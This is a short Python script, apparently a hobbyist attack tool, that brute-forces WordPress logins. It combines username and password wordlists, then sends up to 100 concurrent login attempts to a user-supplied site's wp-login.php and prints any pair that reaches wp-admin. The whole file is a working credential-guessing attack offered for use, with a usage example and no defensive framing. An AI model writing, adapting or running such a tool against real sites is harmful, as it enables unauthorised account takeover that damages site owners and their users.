import requests
import argparse
from itertools import product
from concurrent.futures import ThreadPoolExecutor, as_completed

print("-------------------------------------------------------------")
print("| ELI5-WPS-BF a small wp brute forcing tool by ELAQ & I554M |")
print("-------------------------------------------------------------")
print("example: python ELI5-WPS-BF.py -u username.txt -p wordlist.txt")

session = requests.Session()

def attempt_login(target_url, username, password):
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': target_url + '/wp-admin/',
        'testcookie': '1'
    }
    response = session.post(target_url + '/wp-login.php', data=data)
    if "wp-admin" in response.url:
        print(f"Success! Username: {username}, Password: {password}")
        return True
    else:
        print(f"Failed: Username: {username}, Password: {password}")
        return False

def brute_force(target_url, usernames, passwords):
    with ThreadPoolExecutor(max_workers=100) as executor:  
        futures = []
        for username, password in product(usernames, passwords):
            futures.append(executor.submit(attempt_login, target_url, username, password))
        for future in as_completed(futures):
            if future.result():
                break

def main():
    parser = argparse.ArgumentParser(description="WordPress Brute-Force Tool")
    parser.add_argument("-u", "--username", required=True, help="Path to the username wordlist")
    parser.add_argument("-p", "--password", required=True, help="Path to the password wordlist")
    args = parser.parse_args()

    with open(args.username, 'r', encoding='latin1') as f:
        usernames = [line.strip() for line in f]

    with open(args.password, 'r', encoding='latin1') as f:
        passwords = [line.strip() for line in f]

    target_url = input("Enter the URL of the WordPress site (e.g., https://example.com): ")

    brute_force(target_url, usernames, passwords)

if __name__ == "__main__":
    main()
